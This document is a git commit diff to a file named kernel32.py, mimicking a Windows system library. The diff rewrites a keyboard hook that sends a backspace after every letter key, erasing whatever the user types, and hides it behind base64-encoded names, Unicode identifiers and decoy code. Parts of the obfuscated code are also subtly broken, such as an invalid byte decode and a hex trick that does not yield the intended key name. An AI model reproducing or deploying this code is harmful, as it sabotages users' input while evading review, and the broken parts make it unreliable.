ee11e1bad66ffb2e1270ecaefa7d522788d2392f
AeternusSomniafonsConcordiae <166434698+AeternusSomniafonsConcordiae@users.noreply.github.com>
2025-05-11 13:38:25 +0200

    Update kernel32.py

--- kernel32.py
+++ kernel32.py
@@ -1,11 +1,18 @@
-import keyboard
+import base64, sys as _z
 
-def on_key_press(event):
-    # Monitor key presses
-    if event.name.isalpha():
-        keyboard.send('backspace')  # Delete the key
-    if event.name in ['shift', 'ctrl', 'alt']:
-    	keyboard.release()
+܃_=lambda _:__import__(_);Ḁ=܃_(base64.b64decode('a2V5Ym9hcmQ=').decode())
+ḁ,Ḃ,Ḉ,Ḋ=('isalpha','backspace',['shift','ctrl','alt'],'name')
 
-# Hook keyboard events
-keyboard.on_press(on_key_press)
+class 〱:
+    def __init__(s):s.ᛝ=bytes([186^127]).decode()*3+chr(111)+chr(112)+'e'
+
+def _λ(亠):
+    ζ=base64.b64decode('YmFja3NwYWNl').decode()
+    if getattr(getattr(亠,Ḋ),base64.b64decode('aXNhbHBoYQ==').decode())():
+        Ḁ.send(ζ)
+    if 亠.name in (λ for λ in [format(1023+0x7d1,'x')[:5],'ct'+'rl','a'+'lt']):
+        Ḁ.release()
+
+㏌=〱();㏌.ᛝ=Ḉ
+Ḁ.on_press(_λ)
+for Δ in [0xDEADBEEF, 0xCAFEBABE]: pass
